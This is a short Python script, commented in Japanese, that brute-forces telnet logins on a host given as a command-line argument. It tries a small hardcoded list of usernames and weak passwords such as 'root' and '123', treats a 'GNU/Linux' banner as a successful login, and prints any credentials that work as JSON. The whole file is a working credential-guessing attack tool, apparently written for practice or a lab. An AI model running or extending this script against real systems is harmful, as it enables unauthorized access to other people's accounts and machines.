import telnetlib
import re
import sys
import json

host = sys.argv[1]	#接続先ホスト(実行時の引数で指定)
user_list = ["test", "rootuser"]	#試行ユーザ名リスト
password_list = ["test", "123","root"]	#試行パスワードリスト
timeout_t = 5	#ユーザ名入力時等の応答待ち

for user in user_list :
	for password in password_list :
		# print ("challenge : username ="+user+", password ="+password)
		tn = telnetlib.Telnet(host)	#telnetへの接続
		#ユーザ名の入力
		tn.read_until(b"login:", timeout_t)
		tn.write(user.encode('ascii') + b"\n")

		#ユーザ名入力時点での接続失敗用(タイムアウトのときは未実装)
		res1 = tn.read_until(b"Password:", timeout_t)
		#print(res1.decode("utf-8"))		#うまく行かないときの出力確認用

		if res1.decode("utf-8").endswith("incorrect"):
			# print("login - failed")
			tn.close()
			continue

		#パスワードの入力
		tn.write(password.encode('ascii') + b"\n")

		#バナー表示(デフォルト)でのログイン失敗/成功の判定(しっかり作る際は条件の見直しが必要だと思います)
		res2 = tn.read_until(b"GNU/Linux", timeout_t)
		if res2.decode("utf-8").endswith("GNU/Linux"):
			# print("login - success")
			#tn.close()

			#成功時は終了と共に成功したユーザ名/パスワードの表示
			# print("----------------------")
			# print("login user ="+user+", password ="+password)
			# print("----------------------")
			#うまく行かないときの出力確認用
			#print("\n------\n")
			#print (res2.decode("utf-8"))
			#print("\n------\n")
			print(json.dumps({'result': 'successed', 'user': user, 'pass': password}))

			tn.close()

			exit()
		else :
			# print("login - failed")
			tn.close()
print(json.dumps({'result': 'failed'}))
